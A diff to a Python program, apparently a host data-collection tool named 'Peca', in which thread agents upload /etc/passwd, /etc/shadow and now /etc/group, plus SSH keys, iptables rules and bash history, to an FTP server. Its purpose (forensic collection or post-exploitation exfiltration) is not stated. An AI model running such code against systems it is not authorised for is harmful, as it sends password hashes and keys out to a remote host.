@@ -15,14 +15,14 @@ def check_if_directory_exist(session, directory):
     return False
 
 
-class PasswdShadowAgent(threading.Thread):
+class PasswdShadowGroupAgent(threading.Thread):
     def __init__(self, ftpserver, ftpport, ftpuser, ftppass, core_directory):
-        self.agentName = "Passwd/Shadow Agent"
+        self.agentName = "Passwd/Shadow/Group Agent"
         self.ftpserver = ftpserver
         self.ftpport = ftpport
         self.ftpuser = ftpuser
         self.ftppass = ftppass
-        self.module_path = "PasswdShadow"
+        self.module_path = "PasswdShadowGroup"
         self.session = None
         self.coredirectory = core_directory
 
@@ -69,7 +69,7 @@ class PasswdShadowAgent(threading.Thread):
     def run_task(self):
         self.upload_file("/etc/passwd", False)
         self.upload_file("/etc/shadow", False)
-
+        self.upload_file("/etc/group", False)
 
 class SSHKeyAgent(threading.Thread):
     def __init__(self, ftpserver, ftpport, ftpuser, ftppass, core_directory):
@@ -336,7 +336,7 @@ class Peca:
 
     def spin_up_agents(self):
         # Add all the thread objects
-        self.agentthreads.append(PasswdShadowAgent(self.ftpserver, self.ftpport, self.ftpuser, self.ftppass, self.fullpath))
+        self.agentthreads.append(PasswdShadowGroupAgent(self.ftpserver, self.ftpport, self.ftpuser, self.ftppass, self.fullpath))
         self.agentthreads.append(SSHKeyAgent(self.ftpserver, self.ftpport, self.ftpuser, self.ftppass, self.fullpath))
         self.agentthreads.append(IPTablesAgent(self.ftpserver, self.ftpport, self.ftpuser, self.ftppass, self.fullpath))
         self.agentthreads.append(BashConfigHistoryAgent(self.ftpserver, self.ftpport, self.ftpuser, self.ftppass, self.fullpath))
